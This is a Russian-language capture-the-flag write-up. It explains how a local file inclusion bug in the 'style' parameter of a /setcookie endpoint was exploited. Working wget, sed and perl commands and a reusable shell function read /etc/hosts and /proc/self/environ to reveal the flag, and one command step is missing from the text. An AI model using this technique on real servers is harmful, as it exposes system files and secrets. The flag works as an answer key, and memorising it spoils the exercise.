 воспользовался уязвимостью LFI: сервер принимает путь из параметра style на /setcookie, читает соответствующий файл и вставляет его содержимое внутрь тега <style> на главной странице. Я отправлял style=/etc/hosts, из ответа брал Set-Cookie (JWT), потом с этим cookie запрашивал / и извлекал байты между <style>…</style>, убедившись по /etc/hosts, что чтение работает. Далее тем же способом прочитал /proc/self/environ (заменив нулевые байты на переводы строк) и нашёл переменную CTF_FLAG=YANDEX_CsS_s0_sTyl1sh_So_s1Mpl3, а для контекста проверил /proc/self/cmdline (python3, app.py) и PWD=/app. Таким образом флаг получен без подбора секрета JWT — через включение файлов.


Коротко: я воспользовался уязвимостью LFI (Local File Inclusion) в параметре style на эндпоинте /setcookie. Сервер берёт путь из style, читает соответствующий файл и вставляет его содержимое внутри тега <style>...</style> на главной странице. Я автоматизировал это одной функцией оболочки, затем прочитал /proc/self/environ и нашёл переменную окружения с флагом.

Шаги и команды:

1) Проверил уязвимость чтением /etc/hosts
•  Сначала получаю cookie, установив style=/etc/hosts, потом запрашиваю главную страницу и извлекаю содержимое последнего <style>:
bash


tok=$(wget -qS --save-headers -O- --post-data "style=/etc/hosts" http://158.160.39.5:13355/setcookie 2>&1 \
      | sed -n 's/^  [sS]et-[cC]ookie: cookie=\([^;]*\);.*/\1/p' | tail -n 1)
wget -qO- --header "Cookie: cookie=$tok" http://158.160.39.5:13355/ \
  | perl -0777 -ne 'my @m = ($_ =~ m{<style[^>]*>(.*?)</style>}sig); print $m[-1] if @m;'


Ожидаемый вывод — содержимое /etc/hosts (строки с 127.0.0.1/localhost и т. п.). Это подтвердило LFI.

2) Сделал удобную функцию для чтения любого файла через style
bash


get_style() {
  path="$1"
  tok=$(wget -qS --save-headers -O- --post-data "style=$path" http://158.160.39.5:13355/setcookie 2>&1 \
        | sed -n 's/^  [sS]et-[cC]ookie: cookie=\([^;]*\);.*/\1/p' | tail -n 1)
  wget -qO- --header "Cookie: cookie=$tok" http://158.160.39.5:13355/ \
    | perl -0777 -ne 'my @m = ($_ =~ m{<style[^>]*>(.*?)</style>}sig); print $m[-1] if @m;'
}


3) Прочитал переменные окружения процесса веб-приложения
•  /proc/self/environ разделён нулевыми байтами, поэтому заменил их на переносы строк:
bash


get_style /proc/self/environ | tr '\0' '\n'


Ключевые строки из вывода:
text

PWD=/app
HOME=/root
CTF_FLAG=YANDEX_CsS_s0_sTyl1sh_So_s1Mpl3

4) Дополнительно проверил командную строку процесса
bash
Ожидаемый результат:

python3
app.py

text
Итог:
•  Флаг найден в переменной окружения: YANDEX_CsS_s0_sTyl1sh_So_s1Mpl3
•  Рабочая директория приложения: /app
•  Процесс: python3 app.py

Подсказка: если прямой путь не сработает, иногда помогает схема file:/// (например, style=file:///etc/hosts).
